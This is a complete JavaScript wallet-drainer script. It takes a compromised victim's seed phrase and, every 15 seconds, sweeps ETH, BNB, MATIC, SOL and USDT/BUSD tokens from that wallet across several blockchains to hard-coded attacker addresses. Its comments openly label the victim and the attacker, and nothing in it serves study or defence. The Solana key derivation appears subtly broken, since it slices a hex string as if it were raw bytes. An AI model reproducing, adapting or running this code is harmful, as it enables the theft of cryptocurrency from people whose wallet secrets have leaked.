const { ethers } = require("ethers");
const {
    Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, sendAndConfirmTransaction,
    Transaction, SystemProgram
} = require("@solana/web3.js");
const { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } = require("@solana/spl-token");
require("dotenv").config();

// Load compromised seed phrase from .env
const SCAM_SEED = process.env.SCAM_SEED;
const VICTIM_WALLET = ethers.Wallet.fromPhrase(SCAM_SEED);

// Attacker’s wallet addresses
const ATTACKER_ADDRESS = "0x10f696018bf0d53e6f00d949209cce93d386c3ad"; // EVM-compatible
const ATTACKER_SOL_ADDRESS = "BxK39AK95udUpALngEqRJsrhoTfiKprHEAZdWzggLTHb"; // Solana wallet

// ? List of EVM chains to monitor and drain
const networks = [
    { name: "Ethereum", rpc: "https://ethereum.publicnode.com", symbol: "ETH" },
    { name: "Binance Smart Chain", rpc: "https://bsc-dataseed.binance.org/", symbol: "BNB" },
    { name: "Polygon", rpc: "https://polygon-rpc.com/", symbol: "MATIC" },
    { name: "Arbitrum", rpc: "https://arbitrum.publicnode.com/", symbol: "ETH" }
];

// ? Correct ERC-20/BEP-20 Token Addresses Per Chain
const tokens = {
    "Ethereum": [
        { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 }
    ],
    "Binance Smart Chain": [
        { name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
        { name: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 }
    ],
    "Polygon": [],
    "Arbitrum": []
};

// ? ERC-20 & BEP-20 Token ABI
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) returns (bool)"
];

// ? Function to Drain ETH, BNB, MATIC, and ERC-20/BEP-20 Tokens
async function drainEVMFunds(network) {
    try {
        const provider = new ethers.JsonRpcProvider(network.rpc);
        const scamWallet = new ethers.Wallet(VICTIM_WALLET.privateKey, provider);
        const balance = await provider.getBalance(scamWallet.address);

        // ? Drain native ETH, BNB, or MATIC
        if (balance > ethers.parseEther("0.001")) {
            console.log(`Funds detected on ${network.name}: ${ethers.formatEther(balance)} ${network.symbol}`);

            const gasPrice = (await provider.getFeeData()).gasPrice;
            const nonce = await provider.getTransactionCount(scamWallet.address, "latest");

            const tx = {
                to: ATTACKER_ADDRESS,
                value: balance - ethers.parseEther("0.0001"),
                gasLimit: 21000,
                gasPrice: gasPrice,
                nonce: nonce,
            };

            const txResponse = await scamWallet.sendTransaction(tx);
            console.log(`Draining funds from ${network.name}... TX: ${txResponse.hash}`);
            await txResponse.wait();
            console.log(`Funds successfully drained from ${network.name}`);
        }

        // ? Drain ERC-20/BEP-20 tokens (Only tokens that exist on this chain)
        console.log(`Scanning for tokens on ${network.name}...`);
        if (!tokens[network.name]) {
            console.log(`No known tokens found for ${network.name}. Skipping.`);
            return;
        }

        for (let token of tokens[network.name]) {
            try {
                const tokenContract = new ethers.Contract(token.address, ERC20_ABI, scamWallet);
                const tokenBalance = await tokenContract.balanceOf(scamWallet.address);

                if (tokenBalance > 0n) {
                    console.log(`Draining ${ethers.formatUnits(tokenBalance, token.decimals)} ${token.name} from ${network.name}...`);

                    const tx = await tokenContract.transfer(ATTACKER_ADDRESS, tokenBalance);
                    await tx.wait();
                    console.log(`${token.name} drained from ${network.name}`);
                }
            } catch (tokenError) {
                console.error(`Skipping ${token.name} on ${network.name}: Token may not exist.`, tokenError);
            }
        }
    } catch (error) {
        console.error(`Error draining ${network.name}:`, error);
    }
}

// ? Function to Drain Solana (SOL) and SPL Tokens
async function drainSolanaFunds() {
    try {
        const connection = new Connection("https://api.mainnet-beta.solana.com");
        const victimKeypair = Keypair.fromSeed(Uint8Array.from(VICTIM_WALLET.privateKey.slice(0, 32)));
        const victimPublicKey = victimKeypair.publicKey;
        const attackerPublicKey = new PublicKey(ATTACKER_SOL_ADDRESS);

        // ? Drain SOL
        const solBalance = await connection.getBalance(victimPublicKey);
        if (solBalance > LAMPORTS_PER_SOL * 0.001) {
            console.log(`Funds detected on Solana: ${solBalance / LAMPORTS_PER_SOL} SOL`);

            let solTransaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: victimPublicKey,
                    toPubkey: attackerPublicKey,
                    lamports: solBalance - LAMPORTS_PER_SOL * 0.0001,
                })
            );

            let solSignature = await sendAndConfirmTransaction(connection, solTransaction, [victimKeypair]);
            console.log(`Drained SOL... TX: ${solSignature}`);
        }
    } catch (error) {
        console.error("Error draining Solana assets:", error);
    }
}

// ? Monitor all chains every 15 seconds
setInterval(() => {
    networks.forEach(network => drainEVMFunds(network));
    drainSolanaFunds();
}, 15000);
